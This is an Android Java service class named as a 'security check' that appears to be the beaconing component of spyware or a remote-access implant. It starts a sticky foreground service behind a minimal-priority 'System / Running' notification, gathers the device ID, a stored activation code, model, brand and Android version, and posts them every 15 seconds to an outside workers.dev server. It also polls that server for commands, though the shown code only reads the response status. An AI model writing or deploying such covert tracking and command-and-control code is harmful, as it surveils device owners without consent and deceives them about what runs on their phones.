package com.sec.check;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ServiceRunner extends Service {
    private static final String TAG = "SecurityCheck";
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;
    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";

    private ScheduledExecutorService scheduler;
    private String deviceId = "";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== SERVICE CREATED ===");

        createChannel();
        startForegroundInternal();

        deviceId = getDeviceId();
        Log.d(TAG, "Device ID: " + deviceId);
        Log.d(TAG, "Activation Code: " + getActivationCode());

        // أرسل التقرير
        sendReport();

        // Poll كل 15 ثانية
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                sendReport();
                pollCommands();
            }
        }, 10, 15, TimeUnit.SECONDS);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void startForegroundInternal() {
        try {
            Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
            startForeground(NOTIFICATION_ID, n);
            Log.d(TAG, "✅ Foreground started");
        } catch (Exception e) {
            Log.e(TAG, "❌ startForeground: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private String getActivationCode() {
        try {
            SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
            return sp.getString("activation_code", "");
        } catch (Exception e) { return ""; }
    }

    private String getDeviceId() {
        try {
            return android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID);
        } catch (Exception e) { return "unknown"; }
    }

    private void sendReport() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject d = new JSONObject();
                    d.put("type", "initial");
                    d.put("device", deviceId);
                    d.put("code", getActivationCode());
                    d.put("model", Build.MODEL);
                    d.put("brand", Build.BRAND);
                    d.put("android", Build.VERSION.RELEASE);

                    Log.d(TAG, "Sending report: " + d.toString());

                    URL url = new URL(SERVER_URL + "/apk/data");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);

                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    os.writeBytes(d.toString());
                    os.flush();
                    os.close();

                    int rc = conn.getResponseCode();
                    Log.d(TAG, "✅ Report sent: " + rc);
                } catch (Exception e) {
                    Log.e(TAG, "❌ sendReport: " + e.getMessage());
                }
            }
        }).start();
    }

    private void pollCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = SERVER_URL + "/apk/poll?device=" + deviceId + "&code=" + getActivationCode();
                    Log.d(TAG, "Polling: " + url);

                    URL u = new URL(url);
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);

                    int rc = conn.getResponseCode();
                    Log.d(TAG, "Poll response: " + rc);
                } catch (Exception e) {
                    Log.e(TAG, "❌ poll: " + e.getMessage());
                }
            }
        }).start();
    }
    }
